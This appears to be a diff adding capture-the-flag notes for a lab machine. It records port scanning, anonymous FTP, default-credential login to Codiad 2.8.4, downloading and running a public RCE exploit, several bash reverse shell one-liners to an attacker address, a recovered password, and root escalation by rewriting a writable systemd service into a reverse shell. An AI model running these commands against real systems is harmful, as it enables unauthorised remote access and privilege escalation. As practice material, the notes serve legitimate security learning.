@@ -1,0 +1,81 @@
+## enumeration ## 
+
+rustscan -a  10.10.87.74 -- 
+
+sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.87.74 -e txt .htm. .php .js 
+
+cd /usr/local/bin
+
+sudo python3 autorecon 10.10.87.74
+
+
+## Information ##
+
+PORT      STATE SERVICE REASON
+21/tcp    open  ftp     syn-ack
+22/tcp    open  ssh     syn-ack
+80/tcp    open  http    syn-ack
+62337/tcp open  unknown syn-ack
+
+
+#try ftp anonymous login
+navigate through file structure (series of .,..,..)
+mget * (file named -)
+
+Hey john,
+I have reset the password as you have asked. Please use the default password to login. 
+Also, please take care of the image file ;)
+- drac.
+
+nmap -sT -Pn -A --script vuln -p- -T4 -v 10.10.87.74
+
+
+#port 62337 is running http, so let's open the page in a browser
+http://10.10.87.74:62337/
+Codiad 2.8.4
+
+#from the note above, we have a username that is john telling us to use the default password. I'm going to assume it is password. We test it and it works! john:password
+
+#an internet search of Codiad 2.8.4 CVE shows an RCE https://www.exploit-db.com/exploits/49705 we can use as an exploit. 
+
+can use wget https://raw.githubusercontent.com/WangYihang/Codiad-Remote-Code-Execute-Exploit/master/exploit.py > codiad.py
+
+
+#run the code below but do not press Y yet.
+python codiad.py http://10.10.87.74/ john password 10.8.0.54 1234 linux
+
+#execute the following two commands in two separate windows 
+echo 'bash -c "bash -i >/dev/tcp/10.8.0.54/1235 0>&1 2>&1"' | nc -lnvp 1234
+nc -lnvp 1235
+
+#shell! 
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+#type crtl + z then 
+stty raw -echo; fg
+
+run linpeas.sh 
+
+mysql -u drac -p 'Th3dRaCULa1sR3aL', secret, foobar
+
+#we test ssh drac@10.10.87.74, #shell! 
+
+drac:Th3dRaCULa1sR3aL
+
+
+#run sudo -l and input password
+#we can run sudo /usr/sbin/service vsftpd restart
+
+#get linpeas on system
+#we have write priveledges on /lib/systemd/system/vsftpd.service
+
+#change 
+ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
+#to
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.8.0.54/4444 0>&1"
+
+#open nc -nlvp 4444 and run 
+sudo /usr/sbin/service vsftpd restart
+
+# root! 
